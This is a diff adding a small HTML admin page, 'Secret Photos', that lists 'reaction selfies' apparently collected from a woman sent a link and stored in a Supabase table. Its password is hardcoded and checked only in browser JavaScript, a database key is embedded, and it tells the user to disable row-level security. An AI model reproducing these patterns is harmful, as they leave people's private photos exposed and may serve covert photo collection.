@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin - Secret Photos</title>
+    <style>
+        body { 
+            font-family: 'Outfit', sans-serif; 
+            background: #1a1a2e; 
+            color: white; 
+            text-align: center; 
+            padding: 2rem; 
+        }
+        .grid { 
+            display: flex; 
+            flex-wrap: wrap; 
+            gap: 20px; 
+            justify-content: center; 
+            margin-top: 2rem;
+        }
+        .photo-card {
+            background: rgba(255,255,255,0.1);
+            padding: 10px;
+            border-radius: 15px;
+        }
+        .photo-card img { 
+            max-width: 300px; 
+            border-radius: 10px; 
+            border: 2px solid #ff9a9e; 
+        }
+        input, button { 
+            padding: 12px 20px; 
+            font-size: 1.2rem; 
+            margin: 5px; 
+            border-radius: 10px;
+            border: none;
+            outline: none;
+        }
+        button {
+            background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 100%);
+            color: #333;
+            font-weight: bold;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div id="login">
+        <h2>Enter Admin Password</h2>
+        <input type="password" id="pass" placeholder="Password" />
+        <button onclick="checkPass()">Login</button>
+    </div>
+
+    <div id="dashboard" style="display:none;">
+        <h2>📸 Reaction Selfies Received!</h2>
+        <div class="grid" id="photoGrid"></div>
+    </div>
+
+    <script>
+        const supUrl = 'https://yogdlyemnatyefinhkbf.supabase.co';
+        const supKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlvZ2RseWVtbmF0eWVmaW5oa2JmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU2MDcyMjgsImV4cCI6MjA5MTE4MzIyOH0.PbM4X-yIK1JkQkFRfC0QBv4cwKkHXrtcclXiaH9PBGE';
+
+        function checkPass() {
+            if (document.getElementById('pass').value === 'meryem123') { // Using this as default password
+                document.getElementById('login').style.display = 'none';
+                document.getElementById('dashboard').style.display = 'block';
+                loadPhotos();
+            } else {
+                alert("Incorrect password!");
+            }
+        }
+
+        function loadPhotos() {
+            // Using reverse order to get newest photos first (assuming an 'id' column exists. If error, remove order=)
+            fetch(supUrl + '/rest/v1/photos?select=*', {
+                headers: {
+                    'apikey': supKey,
+                    'Authorization': 'Bearer ' + supKey
+                }
+            })
+            .then(res => res.json())
+            .then(data => {
+                const grid = document.getElementById('photoGrid');
+                if(data.error) {
+                    alert('Error from Supabase: ' + data.error.message);
+                    return;
+                }
+                if(data.length === 0) grid.innerHTML = "<p>No photos yet! Send her the link!</p>";
+                
+                // Show latest first
+                data.reverse().forEach(row => {
+                    const card = document.createElement('div');
+                    card.className = 'photo-card';
+                    const img = document.createElement('img');
+                    img.src = row.image_data;
+                    card.appendChild(img);
+                    grid.appendChild(card);
+                });
+            })
+            .catch(e => {
+                alert("Error connecting to database. Make sure you disabled RLS!");
+                console.error(e);
+            });
+        }
+    </script>
+</body>
+</html>
